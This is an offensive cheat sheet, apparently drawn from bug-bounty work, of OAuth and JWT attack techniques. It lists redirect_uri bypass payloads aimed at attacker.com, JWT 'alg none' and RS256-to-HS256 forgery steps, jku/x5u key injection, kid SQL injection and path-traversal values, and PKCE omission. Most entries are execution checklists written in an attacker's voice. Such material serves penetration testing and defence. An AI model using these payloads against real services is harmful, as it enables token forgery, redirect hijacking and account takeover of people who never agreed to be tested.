#01
Path Traversal & Folder Escape Bypass
CRITICALTRAVERSALHackerOne Reports #1,#2
SCENARIO

// EXECUTION CHECKLIST
  • Intercept OAuth authorization request → find redirect_uri= parameter
  • Try: https://trusted.com/callback/../../attacker.com

"The server checks WHERE the URI starts. It never checks where it ENDS. Traversal exploits the gap between what the validator reads and what the browser actually visits."

#02
Character Injection: @, #, \, Null, Backslash
CRITICALCHAR INJECTIONReport #5
SCENARIO
URL parser ambiguities between OAuth server and browser — inject special characters to make server see "trusted.com" while browser goes to "attacker.com".
// ALL CHARACTER BYPASS VARIANTS
  • @ injection: https://trusted.com@attacker.com (trusted.com = username, attacker.com = host)
  • Fragment #: https://trusted.com%23.attacker.com (validator stops at #, browser continues)
  • Backslash: https://trusted.com\@attacker.com and https://trusted.com\/attacker.com
  • Null byte: https://trusted.com%00.attacker.com
  • Port confusion: https://trusted.com:80@attacker.com
  • Unicode: https://trusted․com (U+2024 ONE DOT LEADER instead of period)
  • Triple slash: https:///attacker.com or https://trusted.com///attacker.com

"URL parsers are inconsistent across languages. What PHP reads as trusted.com, Node.js reads as attacker.com. Find the parser mismatch and you own the redirect."

#22
JWT Algorithm Confusion — none / RS256→HS256
CRITICALJWT FORGE
SCENARIO
Server trusts algorithm field in JWT header. "none" removes signature requirement. RS256→HS256 confusion: server verifies with public key as HMAC secret — a key you already have.
// EXECUTION CHECKLIST
  • Get valid JWT → decode at jwt.io → note algorithm and all claims
  • Test "none": change header to {"alg":"none","typ":"JWT"} → remove signature → send
  • Try case variants: None, NONE, nOnE, NoNe
  • RS256→HS256: get public key from /.well-known/jwks.json → use as HMAC secret with HS256 signing
  • Forge claims: change sub=victim_id, role="admin", email=victim@email.com
  • Tools: jwt_tool -t (all attacks), python-jwt, jwtear

"The public key is in the discovery document — completely public. If the server uses it as an HS256 HMAC secret, I sign any token I want with a key I downloaded from their own website."

#23
JWT kid / jku / x5u Header Injection
CRITICALJWT INJECTIONWAS MISSING
SCENARIO
JWT headers contain URLs (jku, x5u) or paths (kid) that the server fetches to get the public key for verification. Inject attacker URL → server fetches attacker's key → accepts attacker-signed JWT.
// EXECUTION CHECKLIST
  • Decode JWT header → look for: jku, x5u, kid fields
  • jku injection: change jku to https://attacker.com/jwks.json → host your own JWKS there → sign token with your private key
  • kid SQLi: kid: "' UNION SELECT 'attacker_secret'--" → server uses SQL result as signing key
  • kid path traversal: kid: "../../../dev/null" → empty key → sign with empty string
  • x5u injection: same as jku but for X.509 certificate chains
  • Embed injected JWKS inside token itself: jwk header injection (embedded key)

"kid is the OAuth equivalent of SSRF. If the server fetches a URL from a JWT header without validation, you control the signing key by controlling the URL it fetches."

PKCE Bypass — code_verifier Downgrade / Omission
CRITICALPKCE BYPASS
SCENARIO
PKCE was designed to protect public clients. If server marks PKCE as optional or doesn't enforce code_verifier at exchange, any intercepted code can be exchanged without the verifier.
// EXECUTION CHECKLIST
  • Check if request includes code_challenge= and code_challenge_method=S256
  • Remove both params entirely → does authorization proceed? PKCE not required?

  • Send wrong code_verifier → does server reject it? (Tests if PKCE is actually enforced)
  • PKCE bypass confirmed → intercept any code (via referer/log) → exchange without verifier = ATO

"PKCE is a padlock on the code exchange. If the server says 'PKCE optional', the padlock is decorative. Anyone with the code can exchange it — no key needed."
